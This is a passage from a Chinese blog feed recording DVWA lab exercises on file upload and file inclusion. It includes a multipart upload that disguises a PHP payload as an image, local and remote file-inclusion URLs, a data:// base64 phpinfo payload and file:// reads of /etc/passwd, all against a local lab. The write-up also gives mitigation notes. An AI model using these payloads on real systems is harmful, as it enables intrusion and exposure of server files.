&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;3.jpg\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;svg version=\&amp;#34;1.1\&amp;#34; id=\&amp;#34;Capa_1\&amp;#34; xmlns=\&amp;#34;http://www.w3.org/2000/svg\&amp;#34; xmlns:xlink=\&amp;#34;http://www.w3.org/1999/xlink\&amp;#34; x=\&amp;#34;0px\&amp;#34; y=\&amp;#34;0px\&amp;#34; width=\&amp;#34;400px\&amp;#34; height=\&amp;#34;738px\&amp;#34; viewBox=\&amp;#34;0 0 400 738\&amp;#34; enable-background=\&amp;#34;new 0 0 400 738\&amp;#34; xml:space=\&amp;#34;preserve\&amp;#34;&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后再提交，依然不行，淦。这次改成绝对正常的图片附带phpinfo。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426171159207.png"
width="301"
height="76"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426171159207_hu2c81a5a43d22aa3f29f5e3004ba5cfae_2122_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426171159207_hu2c81a5a43d22aa3f29f5e3004ba5cfae_2122_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426171159207"
class="gallery-image"
data-flex-grow="396"
data-flex-basis="950px"
>&lt;/p>
&lt;p>上传！失败而且发现一个警告：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">Warning: getimagesize(): Filename cannot be empty in /var/www/html/vulnerabilities/upload/source/high.php on line 17
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>调试 dvwa 代码后发现是 dvwa 代码里没检查错误，上传失败的原因是图片太大超过了表单限制=。=&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="c1">// 实际上 php 在 $_FILES[ &amp;#39;uploaded&amp;#39; ][ &amp;#39;size&amp;#39; ] 设置的是 0，error 是 2
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>正确做法应该是先检查错误：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不然 &lt;code>$uploaded_tmp&lt;/code> 始终是空字符串的情况下，只会提示 &lt;code>filename cannot be empty&lt;/code> 就很不友好=。=我不确定这算不算 bug 但反正对我这样不太熟悉 php 的人不友好，强行 &lt;code>echo var_dump($_FILES[ 'uploaded' ]);&lt;/code> 才发现有个 &lt;code>error&lt;/code> 被设置成了 2。如果没有这个 &lt;code>error&lt;/code> 的话我可能就要懵上几天了。&lt;/p>
&lt;p>总之，发现问题原因之后，解决之。&lt;/p>
&lt;p>把图片放tinypng压缩一下（160k =&amp;gt; 6k），然后重新用正常图片带 payload，然后在文件包含这一节的漏洞包含这个png文件完成利用。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220427113343344.png"
width="1443"
height="682"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220427113343344_hu98b222d9b96c591e0c6a2e4501db9786_200593_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220427113343344_hu98b222d9b96c591e0c6a2e4501db9786_200593_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427113343344"
class="gallery-image"
data-flex-grow="211"
data-flex-basis="507px"
>&lt;/p>
&lt;p>完成。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>阻止上传的文件没有夹带私货基本不太可能，毕竟可以用各种乱七八糟的办法把代码隐藏起来，比如编码成像素。但阻止利用还是可以的，把文件包含的洞和文件名解析的洞堵上，传个图片马之类的就没什么用了。图片马应该也能通过搜索文件内容是否包含特定字节序列（比如&lt;code>&amp;lt;?php&lt;/code>）来堵一部分利用方式吧，虽然说有误杀的可能。&lt;/p>
&lt;p>还有种做法是考虑不要把上传文件存到可能被当代码解析的地方，比如和代码一起放在 &lt;code>/var/www/html&lt;/code>。可以考虑下部署个 Ceph 之类的对象存储服务或者买大厂的对象存储。这样的话解析漏洞大概率是用不了了，包含漏洞也只要堵上远程包含就行。相应的对象存储服务本身有没有洞，有没有按最佳实践做好保护都会变成新问题=。=这属于是扩大攻击面了。&lt;/p>
&lt;p>不过编程习惯好的码农再加上一门合适的语言和技术选型，相对安全还是能有个大概的保障的吧，咱也不敢说死，毕竟菜，啥也不懂。但烂项目是真的可以很烂，之前玩弄过的一个 Android App 就非常山寨，居然秘钥都敢放客户端=。=这帮人到底怎么做的技术决策我是真的无法理解了。&lt;/p>
&lt;p>好了，哔哔完了。&lt;/p></description></item><item><title>DVWA上手记录-文件包含</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</link><pubDate>Tue, 26 Apr 2022 15:07:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这次玩一下 DVWA 的文件包含。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="php和include">PHP和include&lt;/h3>
&lt;p>在 php 语言中 &lt;code>include&lt;/code> 表达式用于包含指定的文件，写过 C/C++ 应该对 &lt;code>#include&lt;/code> 预处理指令比较熟，php 的 &lt;code>include&lt;/code> 表达式和 &lt;code>#include&lt;/code> 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 &lt;code>#include&lt;/code> 预处理器比较像。&lt;/p>
&lt;p>然后，因为 &lt;code>include&lt;/code> 可以写做表达式的缘故，在 php 里可以 &lt;code>include $file&lt;/code>，如果把用户传入的数据未经过检查就交给 &lt;code>include&lt;/code> 的话就可能产生一个文件包含漏洞。&lt;/p>
&lt;blockquote>
&lt;p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在&lt;a class="link" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener"
>有效的 PHP 起始和结束标记&lt;/a>之中。&lt;/p>
&lt;/blockquote>
&lt;p>解释器的这个行为进一步拓宽了可利用的范围。&lt;/p>
&lt;blockquote>
&lt;p>如果“&lt;a class="link" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener"
>URL include wrappers&lt;/a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见&lt;a class="link" href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener"
>支持的协议和封装协议&lt;/a>）而不是本地文件来指定要被包含的文件。&lt;/p>
&lt;/blockquote>
&lt;p>对 &lt;code>include&lt;/code> 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。&lt;/p>
&lt;h3 id="本地文件包含">本地文件包含&lt;/h3>
&lt;p>本地文件包含一般可以是 &lt;code>include &amp;quot;some/folder/&amp;quot; . $_GET[&amp;quot;file&amp;quot;] . &amp;quot;.php&amp;quot;&lt;/code> 或类似的形式，此时可以通过 &lt;code>file=../../malicious&lt;/code> 这样的 payload 来包含任意代码。&lt;/p>
&lt;h3 id="远程文件包含">远程文件包含&lt;/h3>
&lt;p>此时对 &lt;code>include&lt;/code> 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 &lt;code>zlib://&lt;/code> 之类的协议直接把要执行的代码放在 payload 里。&lt;/p>
&lt;h2 id="文件包含">文件包含&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609.png"
width="694"
height="206"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140326609"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="808px"
>&lt;/p>
&lt;p>页面没有什么特别的，点击上面的 &lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code> 能分别看到三个不同的子页面：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312.png"
width="681"
height="289"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140433312"
class="gallery-image"
data-flex-grow="235"
data-flex-basis="565px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863.png"
width="686"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140441863"
class="gallery-image"
data-flex-grow="233"
data-flex-basis="560px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138.png"
width="692"
height="345"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140450138"
class="gallery-image"
data-flex-grow="200"
data-flex-basis="481px"
>&lt;/p>
&lt;p>注意地址栏会发现有意思的地方：&lt;/p>
&lt;ul>
&lt;li>首页：http://localhost:8080/vulnerabilities/fi/?page=index.php&lt;/li>
&lt;li>file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php&lt;/li>
&lt;li>file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php&lt;/li>
&lt;li>file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php&lt;/li>
&lt;/ul>
&lt;p>很直接地想到 &lt;code>index.php&lt;/code>、&lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code>就是被包含的文件了。尝试提交一个 &lt;code>page=file4.php&lt;/code>，发现彩蛋。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383.png"
width="675"
height="158"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140828383"
class="gallery-image"
data-flex-grow="427"
data-flex-basis="1025px"
>&lt;/p>
&lt;p>直接观察 dvwa 源码，可以发现 &lt;code>include&lt;/code> 出现的位置是 &lt;code>dvwa/vulnerabilities/fi/index.php&lt;/code> 里，&lt;code>php.ini&lt;/code> 配置的 &lt;code>include_path&lt;/code> 应该是包含当前目录 &lt;code>.&lt;/code> 的，所以可以直接取相对路径包含任意文件。&lt;/p>
&lt;p>差不多就是这样了。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>因为已经有一个 phpinfo 页面，我们先尝试包含一下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540.png"
width="1266"
height="325"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426141056540"
class="gallery-image"
data-flex-grow="389"
data-flex-basis="934px"
>&lt;/p>
&lt;p>好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 &lt;code>/dev/stdout&lt;/code> 和 &lt;code>/dev/stderr&lt;/code>，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。&lt;/p>
&lt;p>先试一下远程文件包含。&lt;code>python3 -m http.server&lt;/code>开个 http 服务器，下面放个 &lt;code>2.php&lt;/code>，然后构造 url：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274.png"
width="1323"
height="287"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426142642274"
class="gallery-image"
data-flex-grow="460"
data-flex-basis="1106px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
&lt;p>看看 Medium 难度下的代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Input validation
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;http://&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;https://&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;../&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;..&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>用 &lt;code>str_replace&lt;/code> 替换掉了 &lt;code>../&lt;/code> 和 &lt;code>http://&lt;/code> 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩&amp;hellip;&lt;/p>
&lt;p>改成&lt;code>data://&lt;/code>协议，重写一个 payload：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=&lt;/code>。这段 base64 是 &lt;code> echo '&amp;lt;?php phpinfo(); ?&amp;gt;' | base64&lt;/code> 产生的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441.png"
width="1271"
height="330"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426143248441"
class="gallery-image"
data-flex-grow="385"
data-flex-basis="924px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
&lt;p>High 难度下使用了 &lt;code>fnmatch&lt;/code> 匹配文件名，但模式是 &lt;code>file*&lt;/code>，所以还是有完蛋的可能。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Input validation
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">fnmatch&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;file*&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// This isn&amp;#39;t the page we want!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>先试一下能不能用&lt;code>file://&lt;/code>来 bypass 掉这个模式匹配。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394.png"
width="1044"
height="320"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426143800394"
class="gallery-image"
data-flex-grow="326"
data-flex-basis="783px"
>&lt;/p>
&lt;p>好的，成功 bypass 掉了这个模式，并且包含 &lt;code>/etc/passwd&lt;/code> 成功了。不过&lt;code>/etc/shadow&lt;/code>就没权限了。&lt;/p>
&lt;p>后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。&lt;/p>
&lt;p>我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。&lt;/p>
&lt;h3 id="帮助文档">帮助文档&lt;/h3>
&lt;p>差不多三个难度都解好了，接着看下帮助文档拓宽下思路。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Objective&lt;/strong>&lt;/p>
&lt;p>Read all five famous quotes from &amp;lsquo;&lt;a class="link" href="http://localhost:8080/hackable/flags/fi.php" target="_blank" rel="noopener"
>../hackable/flags/fi.php&lt;/a>&amp;rsquo; using only the file inclusion.&lt;/p>
&lt;/blockquote>
&lt;p>哦？目标是获取 &lt;code>hackable&lt;/code>下的 flag。稍改下 payload 很快就拿到了&lt;code>fi.php&lt;/code>的内容。&lt;/p>
&lt;blockquote>
&lt;p>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don&amp;rsquo;t know.&lt;/p>
&lt;p>&amp;ndash;LINE HIDDEN ;)&amp;ndash;&lt;/p>
&lt;p>4.) The pool on the roof must have a leak.&lt;/p>
&lt;/blockquote>
&lt;p>这个 &lt;code>LINE HIDDEN&lt;/code> 有点怪，不是说 &lt;code>five famous quotes&lt;/code> 吗，这只有4条。于是看了眼 &lt;code>fi.php&lt;/code>，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 &lt;code>fi.php&lt;/code> 下载下来，不然单纯包含这个文件肯定是不行的。&lt;/p>
&lt;p>impossible 难度代码长这样：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Only allow include.php or file{1..3}.php
